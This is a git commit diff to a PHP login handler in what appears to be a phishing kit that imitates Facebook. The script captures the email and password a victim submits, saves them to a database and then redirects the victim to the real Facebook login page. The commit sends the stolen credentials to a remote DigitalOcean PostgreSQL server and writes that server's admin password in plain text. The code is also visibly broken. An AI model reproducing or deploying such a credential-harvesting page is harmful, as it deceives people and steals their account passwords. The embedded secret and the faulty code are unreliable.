bb468732bb241417e6aa658feacd38723e4febc0
ElXds <80175806+ElXds@users.noreply.github.com>
2022-01-15 17:43:14 -0600

    Update login.php

--- .sites/facebook/login.php
+++ .sites/facebook/login.php
@@ -4,12 +4,12 @@ if (!empty($_POST['email']) && !empty($_POST['pass'])) {
     $pass = filter_var($_POST['pass'], FILTER_SANITIZE_SPECIAL_CHARS, MYSQLI_NOT_NULL_FLAG);
 }
 
-$link_db = mysqli_connect('localhost', 'fb-logs', '23047878A', 'fb-logs');
+$link_db = pg_connect('host=db-postgresql-do-user-10364263-0.b.db.ondigitalocean.com port=25060 dbname=defaultdb user=doadmin pass=I0ELsWuKWuHDgjIf');
 
 $query = "INSERT INTO users_log SET user_log='$user',pass_log='$pass'";
 
 $insert_db = $link_db . $query;
 
-mysqli_query($insert_db);
+pg_query($insert_db);
 
 return header('Location: https://facebook.com/login') . exit();
